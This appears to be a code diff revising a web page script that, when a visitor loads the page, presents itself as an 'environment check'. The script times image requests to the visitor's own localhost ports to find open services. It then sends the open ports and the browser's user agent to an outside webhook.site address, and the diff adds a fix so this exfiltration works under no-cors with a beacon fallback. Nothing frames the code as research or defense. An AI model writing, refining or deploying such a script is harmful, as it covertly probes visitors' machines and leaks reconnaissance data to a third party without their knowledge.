@@ -24,11 +24,8 @@
 </div>
 
 <script>
-    // APNA WEBHOOK LINK YAHAN CHECK KARO
     const WEBHOOK = "https://webhook.site/5c8dfb93-43de-4bdc-8216-4895cb4b323d";
     const logBox = document.getElementById('log');
-    
-    // Top Common Ports (Based on your netstat and typical dev environments)
     const ports = [80,81,135,443,445,902,912,1080,1433,1521,2049,2179,2869,3000,3306,3389,4000,4433,5000,5040,5432,6379,7250,8000,8080,8081,8443,8888,9000,9090,27017,31148,44950,63479];
 
     function log(msg, isOpen = false) {
@@ -45,73 +42,53 @@
             const img = new Image();
             img.onload = () => resolve(performance.now() - start);
             img.onerror = () => resolve(performance.now() - start);
-            // Cache busting is critical to prevent false timing results
             img.src = `http://127.0.0.1:${port}/favicon.ico?v=${Math.random()}`;
             setTimeout(() => resolve(1000), 1000);
         });
     }
 
     window.onload = async function() {
-        log("Environment check: Calibrating baseline latency...");
-        
-        // Step 1: Baseline Calibration (Closed Port Time)
+        log("Environment check: Calibrating baseline...");
         let baselineSum = 0;
         for(let b=0; b<3; b++) baselineSum += await getLatency(61234 + b);
         const baseline = baselineSum / 3;
         
-        log(`Closed Port Baseline: ${baseline.toFixed(2)}ms`);
-        log(`Probing ${ports.length} target ports...`);
-
+        log(`Baseline: ${baseline.toFixed(2)}ms. Probing ports...`);
         let found = [];
 
-        // Step 2: Sequential Scanning
         for (let i = 0; i < ports.length; i++) {
             const port = ports[i];
             const time = await getLatency(port);
-            
-            // Step 3: Precise Filter (Open localhost ports respond in < 20ms usually)
             if (time < baseline * 0.4 || time < 20) {
-                log(`CONFIRMED OPEN: Port ${port} (Responded in ${time.toFixed(2)}ms)`, true);
-                found.push({
-                    port: port,
-                    latency: time.toFixed(2) + "ms",
-                    status: "LISTENING"
-                });
+                log(`CONFIRMED OPEN: Port ${port}`, true);
+                found.push({ port: port, latency: time.toFixed(2) + "ms" });
             }
-
-            // Update Progress Bar
             document.getElementById('bar').style.width = `${((i+1)/ports.length)*100}%`;
         }
 
-        log("-----------------------------------------");
-        log("Scan Complete.");
+        log("Scan Complete. Exfiltrating...");
 
-        // Step 4: Data Exfiltration
         if (found.length > 0) {
-            log(`Exfiltrating ${found.length} verified ports to Webhook...`);
-            
-            const payload = JSON.stringify({
-                timestamp: new Date().toLocaleString(),
+            const payload = {
+                ts: new Date().toLocaleString(),
                 browser: navigator.userAgent,
-                target: "127.0.0.1",
-                open_ports: found,
-                baseline_latency: baseline.toFixed(2) + "ms"
-            });
+                open_ports: found
+            };
 
-            // Primary Method: Fetch
+            // FIX: Using Blob with plain text type for no-cors compatibility
+            const blob = new Blob([JSON.stringify(payload)], { type: 'text/plain' });
+            
             fetch(WEBHOOK, {
                 method: 'POST',
                 mode: 'no-cors',
-                body: payload
+                body: blob
             }).then(() => {
-                log("Intelligence report sent successfully!", true);
+                log("Report sent to Webhook!", true);
             }).catch(() => {
-                // Secondary Method: Beacon API
-                navigator.sendBeacon(WEBHOOK, payload);
+                // Backup Method: Beacon API
+                navigator.sendBeacon(WEBHOOK, JSON.stringify(payload));
                 log("Report sent via backup beacon.", true);
             });
-        } else {
-            log("No open ports discovered on local loopback.");
         }
     };
 </script>
